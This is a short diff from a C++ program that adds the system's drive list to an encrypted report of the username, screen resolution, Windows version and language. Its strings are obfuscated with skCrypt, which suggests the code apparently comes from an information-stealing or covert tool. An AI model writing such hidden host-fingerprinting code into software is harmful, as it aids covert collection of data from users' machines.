@@ -117,6 +117,7 @@ int main(int argc, char* argv[]) {
     info_txt += (string)skCrypt("Username: ") + GetUsername() + (string)skCrypt("\n");
     info_txt += (string)skCrypt("Screen resolution: ") + GetResolution() + (string)skCrypt("\n");
     info_txt += (string)skCrypt("Windows version: ") + GetWinVersion() + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("Drives: ") + GetDrives() + (string)skCrypt("\n");
     info_txt += (string)skCrypt("Language: ") + GetLanguage() + (string)skCrypt("\n");
 #endif
     info_txt = aes_encrypt(KEY, info_txt, IV);
